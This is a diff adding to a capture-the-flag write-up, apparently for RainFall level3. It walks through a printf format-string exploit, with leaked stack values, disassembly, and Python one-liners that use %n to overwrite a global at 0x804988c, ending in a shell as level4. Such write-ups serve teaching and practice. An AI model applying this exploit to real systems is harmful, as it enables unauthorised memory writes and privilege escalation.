@@ -88,4 +88,31 @@ AAAABBBBCCCC %x %x %x %x %x %x
 AAAABBBBCCCC 200 b7fd1ac0 b7ff37d0 41414141 42424242 43434343
 ```
 
-let go in gdb and see what is going on
+As we see in this example printf print some adress and then print 41414141 AAAA, and we know that %n will write in memory.
+
+```c
+  0x080484da <+54>:	mov    eax,ds:0x804988c
+   0x080484df <+59>:	cmp    eax,0x40
+```
+
+eax contain the content of 0x804988c so we need to change this value to be equal to 0x40.
+
+```python
+python -c 'print("\x8c\x98\x04\x08" + "%x" * 3 + "%n")' > a
+```
+
+after passing this file to level3 we found that 0x804988c = 23 and 23 its mean how much carracters %n read so we need to add 41 character to be 0x40.
+
+```python
+python -c 'print("\x8c\x98\x04\x08" + "%x" * 3 + "a" * 41 + "%n")' > a
+```
+
+Taraaaaaaa
+
+```c
+level3@RainFall:~$ cat a - | ./level3
+��200b7fd1ac0b7ff37d0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+whoami
+level4
+```
